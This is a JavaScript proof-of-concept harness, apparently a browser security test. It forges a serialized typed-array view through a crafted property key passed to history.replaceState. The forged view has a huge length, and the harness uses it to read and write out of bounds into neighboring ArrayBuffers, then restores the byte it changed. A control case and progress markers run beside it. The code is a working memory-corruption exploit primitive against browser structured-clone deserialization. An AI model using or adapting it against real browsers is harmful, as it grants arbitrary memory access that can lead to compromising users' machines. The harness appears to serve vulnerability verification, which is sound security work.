// Write one byte into the eighth 64 KiB neighbor through the forged view, then restore it.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
function runCase(id, useBigInt) {
  var phase = "build";
  var result;
  try {
    var backing = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(backing).fill(0x41);
    var filler = new Array(253);
    filler[0] = useBigInt ? BigInt(1) << BigInt(40) : 0;
    filler[1] = backing;
    for (var i = 2; i < 26; i++) {
      var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
      new Uint8Array(neighbor).fill(0x40 + i);
      filler[i] = neighbor;
    }
    for (var j = 26; j < filler.length; j++) filler[j] = {};
    var shared = { marker: 0x51515151 };
    var key = makeKey();
    var input = {};
    input.filler = filler;
    input.first = shared;
    input.second = shared;
    input[key] = 0;
    if (useBigInt) mark("alias_ready");
    phase = "store";
    history.replaceState(input, "");
    if (useBigInt) mark("alias_stored");
    phase = "load";
    var output = history.state;
    if (useBigInt) mark("alias_loaded");
    phase = "inspect";
    var target = output.filler[1];
    var synthetic = output["\u0000"];
    var viewValid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
      synthetic.byteOffset === 8 && synthetic.length > 1e12;
    var observed = [];
    var matched = -1;
    var normalBefore = null;
    var syntheticWritten = null;
    var normalAfter = null;
    var syntheticAfter = null;
    var normalRestored = null;
    if (useBigInt && viewValid) {
      mark("alias_before_read");
      phase = "read_neighbor";
      for (var n = 0; n < 8; n++) observed.push(synthetic[524280 + n]);
      mark("alias_after_read");
      phase = "identify_neighbor";
      for (var candidate = 2; candidate < 26; candidate++) {
        var candidateValue = 0x40 + candidate;
        if (observed.every(function(value) { return value === candidateValue; })) {
          matched = candidate;
          break;
        }
      }
      if (matched >= 0) {
        var normal = new Uint8Array(output.filler[matched]);
        normalBefore = normal[0];
        syntheticWritten = normalBefore ^ 0x99;
        phase = "synthetic_neighbor_write";
        synthetic[524280] = syntheticWritten;
        mark("crosswrite_changed");
        phase = "read_neighbor_again";
        syntheticAfter = synthetic[524280];
        normalAfter = normal[0];
        mark("crosswrite_rechecked");
        phase = "restore_neighbor";
        synthetic[524280] = normalBefore;
        normalRestored = normal[0];
        mark("crosswrite_restored");
      }
      phase = "inspect";
    }
    var expected = useBigInt ? viewValid && matched >= 2 &&
      normalBefore === 0x40 + matched && normalAfter === syntheticWritten &&
      syntheticAfter === syntheticWritten && normalRestored === normalBefore :
      output.first === output.second && Object.prototype.hasOwnProperty.call(output, key) && output[key] === 0;
    result = { id: id, status: expected ? "pass" : "fail", details: {
      view_valid: viewValid,
      backing_length: target.byteLength,
      normal_extra_undefined: new Uint8Array(target)[8] === undefined,
      observed_before: observed.join(","),
      matched_filler_index: matched,
      normal_before: normalBefore,
      synthetic_written: syntheticWritten,
      normal_after: normalAfter,
      synthetic_after: syntheticAfter,
      normal_restored: normalRestored,
      first_canary: new Uint8Array(target)[0],
      last_canary: new Uint8Array(target)[7]
    } };
  } catch (error) {
    result = { id: id, status: "error", details: { phase: phase, error: String(error).slice(0, 200) } };
  }
  try { history.replaceState(null, ""); }
  catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
  return result;
}
var control = runCase("neighbor_far_crosswrite_no_bigint_control", false);
if (control.status !== "pass")
  return [control, { id: "neighbor_far_crosswrite_bigint_case", status: "unsupported", details: { reason: "control_failed" } }];
return [control, runCase("neighbor_far_crosswrite_bigint_case", true)];
